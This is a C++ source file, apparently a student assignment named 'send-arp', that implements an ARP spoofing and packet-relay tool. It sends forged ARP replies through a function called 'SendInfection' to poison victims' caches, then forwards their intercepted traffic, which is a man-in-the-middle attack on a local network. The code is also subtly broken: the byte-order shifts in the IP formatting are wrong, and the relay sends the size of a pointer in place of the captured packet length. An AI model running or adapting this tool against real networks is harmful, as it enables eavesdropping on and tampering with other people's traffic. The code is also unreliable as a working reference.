#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <stdlib.h>
#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include <netinet/in.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <map>
#include <string>
#include <iostream>
using namespace std;

typedef struct _arphdr
{
    uint32_t sender_address;
    uint32_t target_address;
}ahdr;
#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

Mac GetMyMac(char *interface);
Mac GetSenderMac(pcap *handle, string sender,Mac myMac, char *ipbuf);
void GetMyIp(char *interface, char *ip_buffer);
void SendInfection(pcap *handle, Mac destmac,Mac mymac, string sourceip, int reply);
void RelayPacket(const u_char *packet);

map<string, Ip> ip_map;
map<string, Mac> mac_map;

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char *argv[])
{
    if(argc < 4 && argc % 2 !=0)
    {
        usage();
        return -1;
    }
    for(int i=2;i <= argc-1;i+=2){
        printf("%s, %s",argv[i], argv[i+1]);
        //ip_map.insert(pair<string,Ip>(argv[i], Ip(argv[i+1])));
        ip_map[string(argv[i])] = Ip(argv[i+1]);
    }


    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    Mac mymac = GetMyMac(argv[1]);
    char ipbuf[32] = {0,};
    GetMyIp(argv[1], ipbuf);
    for(int i=2;i <= argc-1;i+=2){
        GetSenderMac(handle, string(argv[i]), mymac, ipbuf);
        GetSenderMac(handle, string(argv[i+1]), mymac, ipbuf);
        Mac tmp = mac_map[string(argv[i])];
        SendInfection(handle, tmp, mymac, argv[i], 0);
    }
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        struct libnet_ethernet_hdr *eth = (libnet_ethernet_hdr *)packet;
        if(eth->ether_type == htons(EthHdr::Arp))
        {
            //EthArpPacket *ar = (EthArpPacket *)packet;
            /*//libnet_arp_hdr *ip4 = (libnet_arp_hdr *)(packet + 14);
            ahdr *ar = (ahdr *)(packet + 28);
            //string debug = Ip(ar->sender_address);
            uint32_t iptmp = ar->sender_address;
            iptmp = ((iptmp & 0xFF000000) >> 24 |
            (iptmp & 0x00FF0000) >> 8 |
            (iptmp & 0x0000FF00) << 8 |
            (iptmp & 0x000000FF << 24));
            char buf[64]; // enough size
            sprintf(buf, "%u.%u.%u.%u",
                (iptmp & 0xFF000000),
                (iptmp & 0x00FF0000),
                (iptmp & 0x0000FF00),
                (iptmp & 0x000000FF));
                */
            ahdr *ar = (ahdr *)(packet + 28);
            uint32_t tm = ar->sender_address;
            char buf[32];
            sprintf(buf, "%u.%u.%u.%u",
                (tm & 0x000000FF),
                (tm & 0x0000FF00) >> 8,
                (tm & 0x00FF0000) << 16,
                (tm & 0xFF000000) >> 24);
            string debug = string(buf);
            //Ip tmpip = ar->arp_.sip();
            //debug = string(Ip((debug)));
            //int result = ip_map.count(debug);
            if(ip_map.count(debug)){
               SendInfection(handle, mac_map[debug], mymac, debug, 1);
            }
        }
        libnet_ipv4_hdr *ip4 = (libnet_ipv4_hdr *)(packet + 14);
        uint32_t t = ip4->ip_src.s_addr;
        char buf[32];
        sprintf(buf, "%u.%u.%u.%u",
            (t & 0x000000FF),
            (t & 0x0000FF00) >> 8,
            (t & 0x00FF0000) << 16,
            (t & 0xFF000000) >> 24);

        string str = string(buf);
        if(ip_map.count(str)){
           libnet_ethernet_hdr *etmp =(libnet_ethernet_hdr *)packet;
           etmp->ether_shost[0] = mymac.get(0);
           etmp->ether_shost[1] = mymac.get(1);
           etmp->ether_shost[2] = mymac.get(2);
           etmp->ether_shost[3] = mymac.get(3);
           etmp->ether_shost[4] = mymac.get(4);
           etmp->ether_shost[5] = mymac.get(5);
           Ip target_ip = ip_map[str];
           Mac target_mac = mac_map[string(target_ip)];
           etmp->ether_dhost[0] = target_mac.get(0);
           etmp->ether_dhost[1] = target_mac.get(1);
           etmp->ether_dhost[2] = target_mac.get(2);
           etmp->ether_dhost[3] = target_mac.get(3);
           etmp->ether_dhost[4] = target_mac.get(4);
           etmp->ether_dhost[5] = target_mac.get(5);
           int resd = pcap_sendpacket(handle, packet, sizeof(packet));
           if(resd != 0){
               fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
               printf("Error\n");
               continue;
           }
        }//end of the coding enen
    }




    return 0;
}
void GetMyIp(char *interface, char *ip_buffer){
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ -1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    sprintf(ip_buffer, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}

Mac GetMyMac(char *interface){
    int s;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, interface);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    uint8_t data[6];
    char *buf;
    buf = ifr.ifr_hwaddr.sa_data;
    char *dest = (char *)malloc(sizeof(buf[0]));
    strncpy(dest, buf ,1);
    data[0] = *dest;
    strncpy(dest, buf+1 ,1);
    data[1] = *dest;
    strncpy(dest, buf+2 ,1);
    data[2] = *dest;
    strncpy(dest, buf+3 ,1);
    data[3] = *dest;
    strncpy(dest, buf+4 ,1);
    data[4] = *dest;
    strncpy(dest, buf+5 ,1);
    data[5] = *dest;
    return Mac(data);
}

Mac GetSenderMac(pcap *handle, string sender,Mac myMac, char *ipbuf){
    struct pcap_pkthdr* header;
    const u_char* packet2;
    uint8_t data[6];
    do{
        EthArpPacket packet;
        packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
        packet.eth_.smac_ = Mac(std::string(myMac));
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(std::string(myMac));
//        GetMyIp(interface, ipbuf);
        packet.arp_.sip_ = htonl(Ip(ipbuf));
        packet.arp_.tmac_ = Mac("FF:FF:FF:FF:FF:FF");
        packet.arp_.tip_ = htonl(Ip(sender));
        int resd = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if(resd != 0){
            printf("Error\n");
            continue;
        }
    }while(0);

    while (1){
        int res = pcap_next_ex(handle, &header, &packet2);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        struct libnet_ethernet_hdr *eth = (libnet_ethernet_hdr *)packet2;
        EthArpPacket *ar = (EthArpPacket *)packet2;
        if(eth->ether_type == htons(EthHdr::Arp) && (ar->arp_.sip() == Ip(sender)))
        {
            for(int i =0;i < 6;i++){
                data[i] = eth->ether_shost[i];
            }
            mac_map.insert(pair<string,Mac>(sender, Mac(data)));

            string test = string(mac_map[sender]);

            return Mac(data);
        }
    }
}
void SendInfection(pcap *handle, Mac destmac,Mac mymac, string sourceip, int reply){
    EthArpPacket packet;
    do{
        string str = string(sourceip);
    packet.eth_.dmac_ = destmac;
    packet.eth_.smac_ = mymac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    if(reply) packet.arp_.op_ = htons(ArpHdr::Reply);
    else packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = mymac;
    //GetMyIp(interface, ipbuf);
    //Ip my = ip_map.find(string(sourceip));
    packet.arp_.sip_ = htonl(ip_map[sourceip]);
    packet.arp_.tmac_ = mac_map[sourceip];
    packet.arp_.tip_ = htonl(Ip(sourceip));
    int resd = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if(resd != 0){
        printf("Error\n");
        continue;
    }
    }while(0);
}
